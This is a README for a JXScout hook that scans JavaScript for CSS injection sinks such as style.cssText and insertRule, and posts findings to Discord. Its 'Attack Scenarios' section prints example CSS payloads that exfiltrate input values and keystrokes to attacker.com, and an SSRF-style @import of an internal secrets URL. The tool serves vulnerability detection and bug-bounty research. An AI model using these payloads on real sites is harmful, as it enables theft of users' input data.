# JXScout Hooks - CSS Injection Detector

This script detects potential CSS injection vulnerabilities by identifying dynamic CSS manipulation patterns in JavaScript. CSS injection is often overlooked but can lead to data exfiltration, keylogging, and SSRF attacks.

### Integration with JXScout hooks.jsonc

Add this to your `~/.jxscout/hooks.jsonc`:

```jsonc
{
  "global": {
    "asset_saved": {
      "cmd": "DISCORD_WEBHOOK_URL='https://discord.com/api/webhooks/YOUR_ID/YOUR_TOKEN' bun run /path/to/jxscouthooks/examples/css-injection-detector/index.ts"
    }
  }
}
```

## What it detects

### HIGH SEVERITY:
- `style.cssText` assignments - Direct CSS string injection
- `setAttribute('style', ...)` - Style attribute manipulation
- Template literals in `<style>` tags - Dynamic CSS generation
- Style element content assignment - `innerHTML`/`textContent` on style elements

### MEDIUM SEVERITY:
- `CSSStyleSheet.insertRule()` - Dynamic CSS rule insertion
- Dynamic style text nodes
- CSS-in-JS with interpolation - styled-components patterns

## How it works

1. Reads the hook event JSON from stdin
2. Skips HTML files (focuses on JavaScript)
3. Scans each line for CSS injection patterns
4. Reports findings with line numbers and severity
5. Sends Discord webhook with organized results

## Example Output

```
Potential CSS injection vectors in https://example.com/app.js

Found 3 dynamic CSS manipulation(s)

**HIGH SEVERITY (2):**
Line 45: style.cssText assignment
  element.style.cssText = userInput;
Line 89: setAttribute('style')
  div.setAttribute('style', 'color: ' + color);

**MEDIUM SEVERITY (1):**
Line 120: CSSStyleSheet.insertRule()
  sheet.insertRule(`.class { ${prop}: ${value} }`);

**Note:** CSS injection can lead to data exfiltration, keylogging, and SSRF. Review if user input flows into these sinks.
```

## Attack Scenarios

### Data Exfiltration
```css
input[value^="a"] { background: url(https://attacker.com?data=a); }
```
Leak input values character by character through CSS attribute selectors.

### Keylogging
```css
input[value$="p"] { background: url(https://attacker.com?key=p); }
```
Capture keystrokes by loading external resources based on input state.

### SSRF
```css
@import url("https://internal-api.corp.local/secrets");
```
Trigger server-side requests through CSS imports.

## Actionable Intelligence

Findings from this hook can be used to:
- Identify where user input might flow into CSS
- Test for CSS injection by manipulating sources
- Check if CSP blocks external CSS requests
- Look for sensitive data in CSS selectors
- Develop proof-of-concept exploits for bug bounties

## Important Note

This detector identifies potential injection points. Manual review is required to:
1. Trace if untrusted data actually reaches the sink
2. Verify if sanitization is applied
3. Determine exploitability based on context
